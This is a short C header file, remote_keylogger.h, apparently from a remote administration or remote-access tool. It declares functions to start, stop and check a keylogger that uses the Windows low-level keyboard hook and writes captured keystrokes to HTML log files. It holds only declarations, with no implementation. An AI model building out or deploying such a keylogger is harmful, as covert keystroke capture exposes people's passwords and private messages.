/**
 * remote_keylogger.h
 * Keylogging via WH_KEYBOARD_LL. Writes plain HTML to logs directory.
 * Only active when config Keylogging is true.
 */
#ifndef REMOTE_KEYLOGGER_H
#define REMOTE_KEYLOGGER_H

#ifdef __cplusplus
extern "C" {
#endif

/* Start keylogging thread. logs_dir = path to store HTML log files. Returns 1 on success. */
int remote_keylogger_start(const char* logs_dir);

/* Stop keylogging and free resources. */
void remote_keylogger_stop(void);

/* Returns 1 if keylogger is running. */
int remote_keylogger_is_running(void);

#ifdef __cplusplus
}
#endif

#endif /* REMOTE_KEYLOGGER_H */
